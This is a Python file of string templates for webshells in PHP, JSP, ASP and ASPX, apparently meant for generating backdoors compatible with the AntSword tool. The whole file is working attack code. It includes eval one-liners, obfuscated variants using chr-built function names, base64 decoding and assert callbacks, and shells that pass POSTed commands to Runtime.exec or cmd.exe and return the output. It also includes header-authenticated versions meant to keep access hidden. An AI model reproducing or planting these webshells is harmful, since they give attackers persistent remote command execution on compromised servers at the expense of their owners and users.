"""
Webshell templates as constants for AntSword protocol compatibility.

All templates support placeholders:
- {{PASSWORD}}: POST parameter name for command execution
- {{SECRET_HEADER}}: Optional HTTP header name for authentication
- {{SECRET_VALUE}}: Optional HTTP header value for authentication
"""

"""Webshell templates for various languages and authentication methods"""

# PHP Templates


PHP_DEFAULT = """@eval($_POST["{{PASSWORD}}"]);"""

PHP_BASE64 = """eval(base64_decode($_POST["{{PASSWORD}}"]));"""

PHP_CHR = """$a=chr(101).chr(118).chr(97).chr(108);$a($_POST["{{PASSWORD}}"]);"""

PHP_ASSERT = """@assert($_POST["{{PASSWORD}}"]);"""

PHP_CREATE_FUNCTION = """$a=create_function("",$_POST["{{PASSWORD}}"]);$a();"""

PHP_CALLBACK = """array_map("assert",(array)$_POST["{{PASSWORD}}"]);"""

PHP_ONE_LINER = """eval($_POST[{{PASSWORD}}]);"""

# PHP with authentication header
PHP_WITH_AUTH = """if(isset($_SERVER["HTTP_{{SECRET_HEADER}}"]) && $_SERVER["HTTP_{{SECRET_HEADER}}"] == "{{SECRET_VALUE}}") { @eval($_POST["{{PASSWORD}}"]); }"""

PHP_TEMPLATES = {
    "default": PHP_DEFAULT,
    "base64": PHP_BASE64,
    "chr": PHP_CHR,
    "assert": PHP_ASSERT,
    "create_function": PHP_CREATE_FUNCTION,
    "callback": PHP_CALLBACK,
    "one_liner": PHP_ONE_LINER,
    "auth": PHP_WITH_AUTH,
}

# JSP Templates

JSP_DEFAULT = """<%@page import="java.io.*"%>
<%
String pass = "{{PASSWORD}}";
String cmd = request.getParameter(pass);
if(cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while(disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>"""

JSP_BASE64 = """<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%
String pass = "{{PASSWORD}}";
String cmd = request.getParameter(pass);
if(cmd != null){
    byte[] bytesEncoded = java.util.Base64.getDecoder().decode(cmd);
    cmd = new String(bytesEncoded);
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while(disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>"""

JSP_SCRIPT_ENGINE = """<%@page import="javax.script.*"%>
<%
ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
engine.eval(request.getParameter("{{PASSWORD}}"));
%>"""

# JSP with authentication header
JSP_WITH_AUTH = """<%@page import="java.io.*"%>
<%
String authHeader = request.getHeader("{{SECRET_HEADER}}");
if(authHeader != null && authHeader.equals("{{SECRET_VALUE}}")){
    String pass = "{{PASSWORD}}";
    String cmd = request.getParameter(pass);
    if(cmd != null){
        Process p = Runtime.getRuntime().exec(cmd);
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while(disr != null) {
            out.println(disr);
            disr = dis.readLine();
        }
    }
}
%>"""

JSP_TEMPLATES = {
    "default": JSP_DEFAULT,
    "base64": JSP_BASE64,
    "script_engine": JSP_SCRIPT_ENGINE,
    "auth": JSP_WITH_AUTH,
}

# ASP Templates

ASP_DEFAULT = """<%
Dim pass,cmd
pass = "{{PASSWORD}}"
cmd = Request.Form(pass)
If cmd <> "" Then
    Dim oScript
    Set oScript = Server.CreateObject("WSCRIPT.SHELL")
    Dim oExec
    Set oExec = oScript.Exec("cmd.exe /c " & cmd)
    Dim oOutput
    oOutput = oExec.StdOut.ReadAll()
    Response.Write(oOutput)
End If
%>"""

ASP_EVAL = """<%Execute(Request.Form("{{PASSWORD}}"))%>"""

# ASP with authentication header
ASP_WITH_AUTH = """<%
Dim authHeader
authHeader = Request.ServerVariables("HTTP_{{SECRET_HEADER}}")
If authHeader = "{{SECRET_VALUE}}" Then
    Dim pass,cmd
    pass = "{{PASSWORD}}"
    cmd = Request.Form(pass)
    If cmd <> "" Then
        Dim oScript
        Set oScript = Server.CreateObject("WSCRIPT.SHELL")
        Dim oExec
        Set oExec = oScript.Exec("cmd.exe /c " & cmd)
        Dim oOutput
        oOutput = oExec.StdOut.ReadAll()
        Response.Write(oOutput)
    End If
End If
%>"""

ASP_TEMPLATES = {
    "default": ASP_DEFAULT,
    "eval": ASP_EVAL,
    "auth": ASP_WITH_AUTH,
}

# ASPX Templates

ASPX_DEFAULT = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
string pass = "{{PASSWORD}}";
string cmd = Request.Form[pass];
if(cmd != null){
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
    p.WaitForExit();
}
%>"""

ASPX_BASE64 = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
string pass = "{{PASSWORD}}";
string cmd = Request.Form[pass];
if(cmd != null){
    byte[] data = Convert.FromBase64String(cmd);
    cmd = System.Text.Encoding.UTF8.GetString(data);
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
    p.WaitForExit();
}
%>"""

ASPX_JSCRIPT = """<%@ Page Language="Jscript" %>
<%
var pass = "{{PASSWORD}}";
var cmd = Request.Form(pass);
if(cmd != null){
    eval(cmd);
}
%>"""

# ASPX with authentication header
ASPX_WITH_AUTH = """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
string authHeader = Request.Headers["{{SECRET_HEADER}}"];
if(authHeader != null && authHeader == "{{SECRET_VALUE}}"){
    string pass = "{{PASSWORD}}";
    string cmd = Request.Form[pass];
    if(cmd != null){
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
        p.WaitForExit();
    }
}
%>"""

ASPX_TEMPLATES = {
    "default": ASPX_DEFAULT,
    "base64": ASPX_BASE64,
    "jscript": ASPX_JSCRIPT,
    "auth": ASPX_WITH_AUTH,
}
